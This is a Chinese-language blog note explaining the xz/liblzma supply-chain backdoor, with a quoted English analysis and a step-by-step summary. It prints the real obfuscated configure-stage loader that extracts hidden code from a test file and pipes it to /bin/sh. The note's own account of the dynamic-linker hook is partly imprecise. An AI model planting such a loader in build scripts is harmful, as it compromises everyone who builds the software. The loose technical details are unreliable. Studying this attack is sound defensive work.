Timeline of the xz open source attack: https://research.swtch.com/xz-timeline
The xz attack shell script：https://research.swtch.com/xz-script
这里有个xzbot演示了如何利用这个backdoor进行攻击：https://github.com/amlweems/xzbot

```
Andres Freund published the existence of the xz attack on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”

At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during configure, which injects the shell code into make. The shell code during make adds the object file to the build. This post examines the shell script. (See also my timeline post.)

The nefarious object file would have looked suspicious checked into the repository as evil.o, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better "source code" than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just adding a few new test files.

Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. That commit explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.

The effect of the scripts is to arrange for the nefarious object file’s _get_cpuid function to be called as part of a GNU indirect function (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the global offset table (GOT) and procedure linkage table (PLT) read-only, to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for RSA_public_decrypt and replaced it with a nefarious version that runs attacker code when the right SSH certificate is presented.
```

总结下：xz开源项目的贡献者Jia Tan通过持续贡献获得了项目的维护权限，他后来像liblzma（xz的一部分）植入了后门，同时liblzma碰巧又是其他一些项目的依赖，比如大名鼎鼎的OpenSSH sshd，OpenSSH sshd在很多Linux Distros中被使用，如Debian、Ubuntu、Fedora以及其他基于systemd的Linux系统并且patch了sshd去链接到libsystemd，libsystemd也依赖liblzma。

该后门在 SSH 会话开始时能监听攻击者发送的隐藏命令，使攻击者能够在不完成登录鉴权的情况下在目标系统上运行任意命令，不用经过身份验证的、有针对性的远程代码执行，可怕！CVE评级10.0 critical。不过目前并没有Linux Distros的stable版本引入此问题，所以攻击面、影响面其实应该是有限的。

这里是大佬对借助xz backdoor进行攻击的一个分析：https://research.swtch.com/xz-script，这个分析把大致的xz backdoor的工作原理说清楚了，虽然有些细节作者也没全弄清楚，大致是这样：
- 攻击者（实际上是个有权限的维护者），他把恶意代码混淆后，存储在了一个*.xz文件中，并且藏在了tests/目录下，伪装成这是一个xz压缩后的测试文件，用来执行压缩、解压缩测试用例。
  实际上它提交了之后，没有测试用例引用这个压缩文件，没有人注意到这些。
- 源代码中并没有这些恶意的东西，它是把这些有问题的代码全部放在了release的包中，别人下载下来编译构建后说影响的。编译时要先执行./configure，这个脚本最后被植入了一个命令会执行攻击者植入的一个命令，这个命令会检查当前条件是否满足，比如是否是x86_64、glibc系统，恶意代码要生效要利用这些平台、平台工具链的一些特性才能最终有作用。configure最后会执行植入的命令解压之前伪装在*.xz中的攻击代码、去混淆
  ```
  ####Hello####
  #��Z�.hj�
  eval `grep ^srcdir= config.status`
  if test -f ../../config.status;then
  eval `grep ^srcdir= ../../config.status`
  srcdir="../../$srcdir"
  fi
  export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/  dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 &&   (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) &&   head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|  tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
  ####World####
  ```
  这个去混淆后的文件放在附件中的injected.txt中，其实是恶意代码。
- 编译构建的时候，会把这个injected.txt attach到正常构建的*.o中，附件中也有给出 liblzma_la-crc64-fast.o.gz。
- 那这个恶意代码是怎么被执行到的呢？在启动阶段执行符号解析的时候，一个函数符号被解析了，它才能正常跑，为了能绕过这个登录验证逻辑，并且能将某些函数符号指向自己的攻击代码、执行自己的代码，攻击者向dynamic linker中注册了一个登录验证函数的钩子，_dl_audit_symbind，这里面本来是等待用户输入登录认证信息的，但是他利用这个钩子将某个特定函数符号解析到了自己攻击代码的内存地址处，然后以后只要被篡改的“函数”执行到攻击代码，这段攻击代码就可以等待用户输入“任意命令”去执行，而无需通过验证后的ssh回话执行命令。

细节了解到的也不是特别全面，大致过程是这样，这里面有几个点可以事后去多了解下：
- 编译期、连接器、加载器的工作原理
- 攻击者如何向dynamic linker中注册了一个登录验证函数的钩子，_dl_audit_symbind
- 又是如何将某个特定函数符号，解析到指定地址的
- `-Wl,-z,no`, `LD_BIND_NOT=1`, `-Wl,-z,relro` ，对编译期、连接器而言，这几个不同的选项控制的是什么效果？

